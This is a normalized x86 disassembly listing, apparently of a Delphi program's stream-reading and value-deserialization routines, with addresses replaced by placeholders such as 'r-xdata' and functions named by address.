jmp [ eax * 4 + jump_table_417b5c ]
mov eax [ rw-data ]
call sub_4164a0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41063c
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4169bc
cmp al 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_416a7c
xor ecx ecx
mov cl al
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4106b0
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41742c
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_410568
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4106b0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417310
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410940
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41827c
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410840
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_418338
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41086c
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418160
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4106b0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4169bc
sub al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4169bc
cmp al 0xd
jne r-xdata
push ebp
call sub_4179b0
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417598
push edx
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410bc4
jmp r-xdata
push ebp
call sub_417a0c
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41063c
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41752c
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4106b0
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41742c
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_417928
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41841c
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4106b0
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_41742c
mov ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41841c
mov ecx rw-data
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410b8c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41841c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41063c
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_416ad4
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410b8c
jmp r-xdata
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41742c
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_417970
pop ecx
jmp r-xdata
sub_417dd4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor esi esi
mov eax ebx
mov edx edi
call sub_403fe4
jmp r-xdata
mov eax [ ebx ]
call sub_413338
test al al
je r-xdata
inc esi
push ebx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_408a04
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417e34
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41814f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41821c
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_41812d
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4180ee
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_418240
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_418240
mov eax [ ebp - 0x1c ]
call sub_412f0c
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_418240
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x2
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_418240
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_417dd4
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_418240
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
push 0x1
mov eax [ ebp - 0xc ]
call sub_4031a0
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_412c5c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x74 ] eax
xor eax eax
push ebp
push sub_418093
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
call sub_405cfc
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
and [ eax + 0x1c ] 0xfffd
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_413650
xor eax eax
push ebp
push sub_418073
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_413808
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41807a
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_403258
inc ebx
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_4137ac
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_4180c4
call sub_40274c
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403a48
jmp r-xdata
call sub_4039f4
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_4161c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418134
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_4180f3
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_416370
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_4039f4
call sub_403a48
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418134
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0xc ]
call sub_403258
sub_418160
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41820a
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4181dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41841c
cmp al 0xb
je r-xdata
mov eax ebx
call sub_410510
mov eax [ eax + 0x1 ]
mov esi [ eax ]
xor ebx ebx
call sub_4164b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4164f0
cmp eax 0x1f
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418211
lea eax [ ebp - 0x8 ]
call sub_403f90
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418240
cmp [ ebp - 0x8 ] 0x0
je r-xdata
bts ebx eax
jmp r-xdata
sub_418240
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_4169e0
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_404080
mov eax esi
call j_sub_40445c
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_4169e0
pop edx
pop esi
pop ebx
retn
sub_41827c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_418329
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4169bc
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_418338
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404218
jmp r-xdata
sub al 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418330
lea eax [ ebp - 0x8 ]
call sub_404670
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41841c
sub al 0x6
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_4169e0
jmp r-xdata
sub al 0x6
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4045dc
mov edx [ esi ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_4169e0
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_4169e0
jmp r-xdata
jmp r-xdata
call sub_4164b8
sub_418338
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41840f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4169bc
sub al 0x6
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41827c
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4047bc
jmp r-xdata
sub al 0x6
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418416
lea eax [ ebp - 0xc ]
call sub_403f90
lea eax [ ebp - 0x8 ]
call sub_403f90
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41841c
sub al 0x12
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_4169e0
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4048b8
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx [ esi ]
mov eax ebx
call sub_4169e0
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_4169e0
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_4045dc
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_4169e0
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_40599c
jmp r-xdata
jmp r-xdata
call sub_4164b8
sub_418430
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41846c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_418240
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418473
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
sub_418478
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_416678
test al al
je r-xdata
mov eax [ ebx ]
call sub_41852c
mov eax [ ebx ]
call sub_4175e4
pop ebx
pop ebp
retn
sub_4184a0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_4169e0
mov edx [ ebp - 0x4 ]
imul edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_418924
pop ebx
pop ecx
pop ebp
retn
sub_4184d0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_416678
test al al
je r-xdata
mov eax [ ebx ]
call sub_4169bc
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebx ]
call sub_4175e4
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edx 0x1
call sub_418924
jmp r-xdata
mov eax [ ebx ]
call sub_41852c
mov eax [ ebx ]
call sub_416678
test al al
je r-xdata
mov eax [ ebx ]
call sub_4186c8
mov eax [ ebx ]
call sub_4175e4
sub_41852c
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4186bb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41841c
and eax 0x7f
cmp eax 0x14
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4186c2
lea eax [ ebp - 0x8 ]
call sub_403f90
retn
jmp [ eax * 4 + jump_table_418563 ]
push ebp
call sub_418478
pop ecx
jmp r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_418924
jmp r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_418924
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_418924
jmp r-xdata
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_418924
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418240
jmp r-xdata
push ebp
mov eax 0x1
call sub_4184a0
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_418430
jmp r-xdata
push ebp
mov eax 0x1
call sub_4184a0
pop ecx
jmp r-xdata
push ebp
call sub_4184d0
pop ecx
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_418924
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_418924
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_418924
jmp r-xdata
push ebp
mov eax 0x2
call sub_4184a0
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_418924
jmp r-xdata
push ebp
mov eax 0x1
call sub_4184a0
pop ecx
sub_4186c8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_418705
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_418240
mov eax ebx
call sub_41852c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41870c
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
sub_418710
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_4187a8
push [ fs : eax ]
mov [ fs : eax ] esp
test dl dl
je r-xdata
mov eax ebx
call sub_416678
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x24 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_418240
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_418240
jmp r-xdata
mov eax ebx
call sub_4186c8
mov eax ebx
call sub_4175e4
jmp r-xdata
mov eax ebx
call sub_416678
test al al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_418710
mov eax ebx
call sub_4175e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4187af
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fb4
retn
sub_4187b8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41885d
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_404028
xor eax eax
mov [ ebp - 0x4 ] eax
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_419654
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418864
lea eax [ ebp - 0x8 ]
call sub_403f90
retn
cmp [ ebx + 0x52 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b37c
call sub_4039cc
sub_418888
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop edi
pop esi
pop ebx
retn
push esi
mov edi eax
mov ecx ebx
mov edx eax
mov eax [ edi + 0x44 ]
call [ edi + 0x40 ]
sub_4188b0
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov ecx esi
mov edx [ ebx + 0x18 ]
mov eax ebx
call sub_416910
mov [ esp ] eax
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x18 ]
je r-xdata
mov eax esi
call sub_412e4c
mov edx [ r-xdata ]
mov eax [ esp ]
call sub_40346c
test al al
jne r-xdata
mov ecx esi
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_416910
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_418924
push ebx
push esi
add esp 0xffffff00
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
add esp 0x100
pop esi
pop ebx
retn
cmp ebx 0x100
jle r-xdata
mov edx esp
mov ecx ebx
mov eax esi
call sub_4169e0
xor ebx ebx
mov edx esp
mov ecx 0x100
mov eax esi
call sub_4169e0
sub ebx 0x100
jmp r-xdata
test ebx ebx
jg r-xdata
sub_41896c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_418b15
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xa
call sub_416544
xor eax eax
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418af0
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_4169e0
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_415470
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_4169e0
push 0x400
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_415e00
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_418acb
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_41827c
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0xc ]
call sub_4169e0
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x8 ]
call sub_415470
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_4169e0
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_4101b0
test al al
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
call sub_4039cc
lea eax [ ebp - 0x1c ]
call sub_4055cc
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_40cb98
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x4 ]
mov [ ebx ] ax
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418ad2
mov eax [ ebp - 0xc ]
call sub_403258
retn
sub_418b34
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418d2e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40e70c
mov eax [ ebp - 0x4 ]
call sub_4169bc
and eax 0x7f
cmp eax 0x14
ja r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
call sub_4039cc
jmp [ eax * 4 + jump_table_418b76 ]
mov eax [ ebp - 0x4 ]
call sub_41841c
cmp al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41752c
mov edx eax
movsx edx dl
mov eax ebx
mov cl 0xff
call sub_40f9e8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41752c
mov edx eax
movsx edx dx
mov eax ebx
mov cl 0xfe
call sub_40f9e8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41752c
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_40f9e8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417310
mov eax ebx
call sub_40fa78
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417354
mov eax ebx
call sub_40fa78
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417398
mov eax ebx
call sub_40faa0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4173e8
mov eax ebx
call sub_40fa8c
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41827c
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_40fab4
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_418338
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_40fae0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41841c
cmp al 0x9
sete dl
mov eax ebx
call sub_40fa50
jmp r-xdata
push ebp
lea eax [ ebp - 0x1c ]
call sub_41896c
pop ecx
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_40ea34
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417598
push edx
push eax
mov eax ebx
call sub_40fa24
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418d35
lea eax [ ebp - 0x1c ]
call sub_40e720
lea eax [ ebp - 0xc ]
call sub_404670
lea eax [ ebp - 0x8 ]
call sub_403f90
retn
mov eax ebx
call sub_410298
jmp r-xdata
sub_418d3c
push esi
push edi
push ebx
mov esi edx
mov ebx ecx
mov edi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax edi
call sub_418d88
mov ecx [ edi + 0xc ]
sub ebx ecx
push edi
mov eax [ edi + 0x8 ]
add eax [ edi + 0x10 ]
add [ edi + 0x10 ] ecx
mov edi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov ecx ebx
sub_418db4
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
cmp [ esp ] 0xffffff80
jl r-xdata
cmp [ esp ] 0xffff8000
jl r-xdata
cmp [ esp ] 0x7f
jg r-xdata
mov dl 0x4
mov eax ebx
call sub_418f24
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_418d3c
cmp [ esp ] 0x7fff
jg r-xdata
mov dl 0x2
mov eax ebx
call sub_418f24
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_418d3c
pop edx
pop ebx
retn
mov dl 0x3
mov eax ebx
call sub_418f24
mov edx esp
mov ecx 0x2
mov eax ebx
call sub_418d3c
jmp r-xdata
pop edx
pop ebx
retn
sub_418e38
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
mov edx edi
call sub_40439c
je r-xdata
mov eax esi
call sub_404250
mov [ esp ] eax
cmp [ esp ] 0xff
jg r-xdata
mov eax edi
call sub_404250
mov [ esp ] eax
mov dl 0x14
mov eax ebx
call sub_418f24
mov edx esp
